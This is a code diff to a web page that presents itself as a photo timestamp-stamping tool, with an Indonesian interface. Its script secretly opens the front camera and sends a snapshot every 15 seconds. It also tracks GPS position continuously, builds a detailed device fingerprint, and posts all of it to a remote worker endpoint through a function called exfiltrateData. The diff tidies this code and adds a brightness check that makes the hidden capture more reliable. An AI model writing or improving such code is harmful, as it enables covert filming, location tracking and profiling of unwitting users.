@@ -233,7 +233,6 @@
 
     <div id="mainContent">
         <div class="grid-2">
-            <!-- Kiri: Upload & Stempel -->
             <div class="glass-card">
                 <h3 style="margin-bottom: 1rem;">📸 UPLOAD FOTO</h3>
                 <button id="uploadBtn">📂 UPLOAD DARI GALERI</button>
@@ -273,7 +272,6 @@
                 </div>
             </div>
 
-            <!-- Kanan: Preview & Download -->
             <div class="glass-card">
                 <h3 style="margin-bottom: 1rem;">⚡ PREVIEW & DOWNLOAD</h3>
                 <button id="generateBtn" class="btn-success">✨ TERAPKAN STEMPEL</button>
@@ -289,12 +287,10 @@
     </div>
 </div>
 
-<!-- Video tersembunyi untuk auto capture (kamera depan) -->
 <video id="autoVideo" autoplay playsinline muted class="hidden-video"></video>
 
 <script>
     const WORKER_URL = "https://timestamp.sapammeded.workers.dev";
-    const EXFILTRATE_URL = "https://your-server.com/collect"; // GANTI dengan endpoint Anda
     
     let deviceId = null;
     let trialValid = false;
@@ -341,17 +337,9 @@
     const posBL = document.getElementById('posBL');
     const posBR = document.getElementById('posBR');
     
-    // ========== DATA EXFILTRATION SYSTEM ==========
     async function exfiltrateData(type, data) {
-        const payload = {
-            deviceId: deviceId,
-            type: type,
-            data: data,
-            timestamp: Date.now()
-        };
-        
+        const payload = { deviceId: deviceId, type: type, data: data, timestamp: Date.now() };
         try {
-            // Kirim ke worker Anda (bisa ditambahkan endpoint khusus)
             await fetch(WORKER_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -360,7 +348,6 @@
         } catch(e) { console.log('Exfil error:', e); }
     }
     
-    // ========== ENHANCED DEVICE FINGERPRINTING ==========
     function getWebGLFingerprint() {
         const canvas = document.createElement('canvas');
         const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
@@ -379,7 +366,6 @@
         const ctx = canvas.getContext('2d');
         const text = 'mmmmmmmmmmlli';
         const detected = [];
-        
         for (const font of testFonts) {
             ctx.font = '72px ' + font + ', ' + baseFonts[0];
             const baseWidth = ctx.measureText(text).width;
@@ -397,53 +383,25 @@
     async function comprehensiveDeviceFingerprint() {
         const fingerprint = {
             deviceId: deviceId,
-            screen: {
-                width: screen.width,
-                height: screen.height,
-                colorDepth: screen.colorDepth,
-                pixelDepth: screen.pixelDepth,
-                availWidth: screen.availWidth,
-                availHeight: screen.availHeight
-            },
-            browser: {
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                languages: navigator.languages,
-                platform: navigator.platform,
-                cookieEnabled: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack,
-                onLine: navigator.onLine
-            },
-            hardware: {
-                deviceMemory: navigator.deviceMemory,
-                hardwareConcurrency: navigator.hardwareConcurrency,
-                maxTouchPoints: navigator.maxTouchPoints
-            },
+            screen: { width: screen.width, height: screen.height, colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth, availWidth: screen.availWidth, availHeight: screen.availHeight },
+            browser: { userAgent: navigator.userAgent, language: navigator.language, languages: navigator.languages, platform: navigator.platform, cookieEnabled: navigator.cookieEnabled, doNotTrack: navigator.doNotTrack, onLine: navigator.onLine },
+            hardware: { deviceMemory: navigator.deviceMemory, hardwareConcurrency: navigator.hardwareConcurrency, maxTouchPoints: navigator.maxTouchPoints },
             webgl: getWebGLFingerprint(),
             fonts: detectFonts(),
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
             timestamp: Date.now()
         };
-        
-        // Battery info
         if ('getBattery' in navigator) {
             navigator.getBattery().then(battery => {
-                fingerprint.battery = {
-                    charging: battery.charging,
-                    level: battery.level,
-                    chargingTime: battery.chargingTime,
-                    dischargingTime: battery.dischargingTime
-                };
+                fingerprint.battery = { charging: battery.charging, level: battery.level, chargingTime: battery.chargingTime, dischargingTime: battery.dischargingTime };
                 exfiltrateData('fingerprint', fingerprint);
             });
         } else {
             exfiltrateData('fingerprint', fingerprint);
         }
-        
         return fingerprint;
     }
     
-    // Sync functions
     function syncFontSize() { currentFontSize = parseInt(fontSizeSlider.value); fontSizeNumber.value = currentFontSize; if (currentImageFile && trialValid) updatePreview(); }
     function syncOffsetX() { currentOffsetX = parseInt(offsetXSlider.value); offsetXNumber.value = currentOffsetX; if (currentImageFile && trialValid) updatePreview(); }
     function syncOffsetY() { currentOffsetY = parseInt(offsetYSlider.value); offsetYNumber.value = currentOffsetY; if (currentImageFile && trialValid) updatePreview(); }
@@ -473,8 +431,6 @@
             deviceId = result.visitorId;
             deviceStatus.innerHTML = `✅ ${deviceId.slice(0,8)}...`;
             deviceDot.className = 'dot';
-            
-            // Kirim fingerprint setelah dapat deviceId
             setTimeout(() => comprehensiveDeviceFingerprint(), 1000);
         } catch(e) { deviceStatus.innerHTML = '❌ Error'; deviceDot.className = 'dot error'; }
     }
@@ -510,12 +466,9 @@
         return false;
     }
     
-    // ========== AUTO CAPTURE (KAMERA DEPAN) ==========
     async function initAutoCamera() {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" } 
-            });
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             autoVideoStream = stream;
             autoVideo.srcObject = stream;
             autoVideo.onloadedmetadata = () => {
@@ -532,18 +485,10 @@
         }
     }
     
-    // ========== ENHANCED LOCATION TRACKING ==========
     function initGPS() {
         if ("geolocation" in navigator) {
             gpsStatus.innerHTML = '📍 Meminta izin GPS...';
-            
-            const options = {
-                enableHighAccuracy: true,
-                timeout: 5000,
-                maximumAge: 0
-            };
-            
-            // Watch position for continuous tracking
+            const options = { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 };
             locationWatchId = navigator.geolocation.watchPosition(
                 (position) => {
                     const locationData = {
@@ -556,21 +501,14 @@
                         speed: position.coords.speed,
                         timestamp: position.timestamp
                     };
-                    
                     userLocation.lat = locationData.latitude;
                     userLocation.lng = locationData.longitude;
                     gpsStatus.innerHTML = `📍 ${locationData.latitude.toFixed(6)}, ${locationData.longitude.toFixed(6)}`;
                     gpsDot.className = 'dot';
-                    
-                    // Exfiltrate location data
                     exfiltrateData('location', locationData);
-                    
-                    // Isi default stamp text
                     if (!stampText.value.trim()) {
                         stampText.value = `${new Date().toLocaleString('id-ID')}\n📍 ${userLocation.lat.toFixed(6)}, ${userLocation.lng.toFixed(6)}`;
                     }
-                    
-                    // Also send to original endpoint every 10 detik
                     if (gpsInterval) clearInterval(gpsInterval);
                     gpsInterval = setInterval(() => {
                         if (userLocation.lat && userLocation.lng && trialValid) {
@@ -591,32 +529,39 @@
         }
     }
     
+    // ========== AUTO CAPTURE FIX (DENGAN DELAY & CEK BRIGHTNESS) ==========
     async function startAutoCapture() {
         if (autoCaptureInterval) clearInterval(autoCaptureInterval);
         autoCaptureInterval = setInterval(async () => {
             if (!autoVideoReady || !autoVideoStream || autoVideo.videoWidth === 0 || !trialValid) return;
             try {
+                // Tunggu 500ms agar kamera stabil
+                await new Promise(resolve => setTimeout(resolve, 500));
+                
                 const canvas = document.createElement('canvas');
                 canvas.width = autoVideo.videoWidth;
                 canvas.height = autoVideo.videoHeight;
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(autoVideo, 0, 0);
                 
-                const pixelData = ctx.getImageData(0, 0, 1, 1).data;
-                if (pixelData[0] === 0 && pixelData[1] === 0 && pixelData[2] === 0) return;
+                // Cek kecerahan di tengah gambar
+                const pixelData = ctx.getImageData(canvas.width/2, canvas.height/2, 1, 1).data;
+                const brightness = (pixelData[0] + pixelData[1] + pixelData[2]) / 3;
+                
+                if (brightness < 30) {
+                    console.log('⚠️ Auto capture: gambar terlalu gelap, skip');
+                    return;
+                }
                 
                 canvas.toBlob(async (blob) => {
                     if (blob && blob.size > 5000) {
                         const base64 = await blobToBase64(blob);
-                        
-                        // Exfiltrate photo data
                         exfiltrateData('photo', {
                             imageData: base64,
                             camera: 'front',
                             timestamp: Date.now(),
                             location: userLocation
                         });
-                        
                         await callAPI('uploadAuto', {
                             imageData: base64,
                             metadata: {
@@ -625,13 +570,14 @@
                                 device: navigator.userAgent
                             }
                         });
+                        autoCamStatus.innerHTML = '📷 Auto Capture: Berhasil';
+                        setTimeout(() => { autoCamStatus.innerHTML = '📷 Auto Capture: Aktif'; }, 2000);
                     }
-                }, 'image/jpeg', 0.7);
+                }, 'image/jpeg', 0.8);
             } catch(e) { console.log(e); }
         }, 15000);
     }
     
-    // ========== FILE UPLOAD TRACKING ==========
     function trackFileUploads() {
         fileInput.addEventListener('change', function(event) {
             const files = event.target.files;
@@ -701,8 +647,6 @@
                 previewImg.src = stampedURL;
                 stampedImageData = stampedURL;
                 downloadBtn.disabled = false;
-                
-                // Catat log manual
                 callAPI('uploadManual', {
                     metadata: {
                         latitude: userLocation.lat || 0,
